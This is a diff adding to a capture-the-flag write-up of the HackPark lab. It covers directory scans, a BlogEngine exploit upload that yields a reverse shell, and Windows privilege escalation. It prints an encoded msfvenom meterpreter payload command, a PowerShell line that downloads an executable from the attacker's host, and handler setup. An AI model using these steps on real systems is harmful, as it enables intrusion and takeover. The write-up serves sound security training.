@@ -48,6 +48,8 @@ Nmap done: 1 IP address (1 host up) scanned in 88.61 seconds
 ### Dirb
 
 #### dirb-top.scan
+```
+
 root@kali:~# dirb http://10.10.113.96 /usr/share/wordlists/dirb/common.txt -r -o dirb-top.scan
 
 -----------------
@@ -116,8 +118,11 @@ GENERATED WORDS: 4612
 -----------------
 END_TIME: Sun May 22 01:30:26 2022
 DOWNLOADED: 4612 - FOUND: 38
+```
 
 #### dirb-top2.scan
+```
+
 root@kali:~# dirb http://10.10.113.96 /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -r -o dirb-top2.scan
 
 -----------------
@@ -254,10 +259,11 @@ GENERATED WORDS: 87568
 -----------------
 END_TIME: Sun May 22 01:51:13 2022
 DOWNLOADED: 22406 - FOUND: 101
-
+```
 
 
 ### Nikto
+```
 root@kali:~# nikto -host 10.10.113.96 -Format txt -o nikto.scan
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
@@ -286,9 +292,11 @@ root@kali:~# nikto -host 10.10.113.96 -Format txt -o nikto.scan
 + End Time:           2022-05-22 02:53:43 (GMT0) (28 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested
+```
 
 
 ### Gobuster
+```
 root@kali:~# gobuster dir -t 50 -o gobuster.scan --url 10.10.113.96 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
 /archives             (Status: 200) [Size: 8313]
 /blog                 (Status: 500) [Size: 1208]
@@ -1151,6 +1159,7 @@ root@kali:~# gobuster dir -t 50 -o gobuster.scan --url 10.10.113.96 -w /usr/shar
 /DefaultConfPop       (Status: 500) [Size: 1763]
 /SearchIndexingRobotsSecurity (Status: 200) [Size: 8416]
 /contacting-me        (Status: 200) [Size: 9928]
+```
 
 
 ## Task 2 - Hyrda and brute forcing a login
@@ -1208,11 +1217,127 @@ Exploit-Database is a CVE (common vulnerability and exposures) archive of public
 **Answer the questions below**
 
 *Now you have logged into the website, are you able to identify the version of the BlogEngine?* 3[REDACTED]0
+
 *Use the [exploit database archive](http://www.exploit-db.com) to find an exploit to gain a reverse shell on this system. What is the CVE?* CVE-[REDACTED]
+* Search `exploit-db.com` for BlogEngine and the version number.
+* Download the exploit.
+* Update the callback <ip> to match your attack machine.
+* Change the port number if desired.
+* Rename the script as directed in the exploit.
+* Upload the script to the target web server.
+	* This is done using the upload function. Select the existing post.
+	* Then select the upload icon in the menu bar.
+	* In the dialog box, navigate to the location of the newly named exploit script.
+	* Click upload. 
+* Open a netcat listener on the same port as the script.
+* Access the main blog page using the `theme` override as directed in the script.
+* A reverse shell should trigger on your attack machine.
+
 *Using the public exploit, gain initial access to the server. Who is the webserver running as?* II[REDACTED]og
+Use the `whoamI` command to get the username.
 
 
 ## Task 4 - Windows Privilege Escalation
 
+In this task we will learn about the basics of Windows Privilege Escalation.
+
+First we will pivot from netcat to a meterpreter session and use this to enumerate the machine to identify potential vulnerabilities. We will then use this gathered information to exploit the system and become the Administrator.
+
+**Answer the questions below** 
+
+Our netcat session is a little unstable, so lets generate another reverse shell using msfvenom.
+
+If you don't know how to do this, I suggest completing the [Metasploit](https://tryhackme.com/room/rpmetasploit) room first!  
+
+_Tip: You can generate the reverse-shell payload using msfvenom, upload it using your current netcat session and execute it manually!_
+
+You can run metasploit commands such as sysinfo to get detailed information about the Windows system. Then feed this information into the [windows-exploit-suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester) script and quickly identify any obvious vulnerabilities.
+
+The process:
+* Create a Metasploit payload in `msfvenom`. 
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
+```  
+* Replace the IP with your attack machine's.
+* Replace the port with one of your choosing.
+* Select a name for your shell and run the command.
+* Start a web server on your attack machine in the directory where the payload file is located. `python3 -m http.server`.
+* Using the existing netcat session, transfer the file from your attack machine to the target. Use the command below replacing the <ip> with your attack machine's IP.
+```bash
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
+```
+* Start Metasploit and launch the `event/multi/handler`. 
+```bash
+┌──(bradley㉿kali)-[~/THM/HackPark]
+└─$ msfconsole
+msf6 > use exploit/multi/handler
+msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 > set LHOST <my-ip>
+msf6 > set LPORT 4321
+msf6 > exploit
+listening prompt...
+```
+Note: The `LPORT` must match the port used in the `msfvenom` payload, and the `LHOST` should be your attack miachine's IP.
+* Run the payload on the target and get a reverse shell. 
+`.\my-shell.exe`
+
+```bash
+msf6 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on <my-ip>:4321 
+[*] Sending stage (175174 bytes) to 10.10.152.93
+[*] Meterpreter session 1 opened (<my-ip>:4321 -> 10.10.152.93:49258) at 2022-05-29 16:03:55 -0400
+meterpreter > sysinfo
+Computer        : HACKPARK
+OS              : Windows [REDACTED].
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+```
+
+*What is the OS version of this windows machine?* Windows [REDACTED]
+
+Further enumerate the machine.
+
+*What is the name of the abnormal _service_ running?* Wi[REDACTED]er
+It took me a bit to land on the right service. Lots of searching. Once I got the service name, a look at the system logs showed it ran every 30 seconds as root. 
+
+*What is the name of the binary you're supposed to exploit?* M[REDACTED].exe
+
+*Using this abnormal service, escalate your privileges!*
+That worked as follows:
+* I transfered the same meterpreter payload to the proper directory.
+* Startetd another meterpreter listener.
+* Renamed the service.
+* Renamed `my-shell.exe`.
+* A reverse shell was established in meterpreter. But now as root.
+
+*What is the user flag (on Jeffs Desktop)?* 75[REDACTED]39
+
+*What is the root flag?* 7e[REDACTED]72
+
 
 ## Task 5 - Privilege Escalation Without Metasploit
+
+In this task we will escalate our privileges without the use of meterpreter/metasploit! 
+
+Firstly, we will pivot from our netcat session that we have established, to a more stable reverse shell.
+
+Once we have established this we will use winPEAS to enumerate the system for potential vulnerabilities, before using this information to escalate to Administrator.  
+
+Answer the questions below
+
+Now we can generate a more stable shell using msfvenom, instead of using a meterpreter, This time let's set our payload to windows/shell_reverse_tcp  
+
+After generating our payload we need to pull this onto the box using [powershell](https://tryhackme.com/room/powershell).  
+_Tip: It's common to find C:\Windows\Temp is world writable!_  
+
+Now you know how to pull files from your machine to the victims machine, we can pull winPEAS.bat to the system using the same method! ([You can find winPEAS here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASbat))
+
+WinPeas is a great tool which will enumerate the system and attempt to recommend potential vulnerabilities that we can exploit. The part we are most interested in for this room is the running processes!
+
+_Tip: You can execute these files by using .\filename.exe_
+
+*Using winPeas, what was the Original Install time? (This is date and time)* 8/[REDACTED]AM
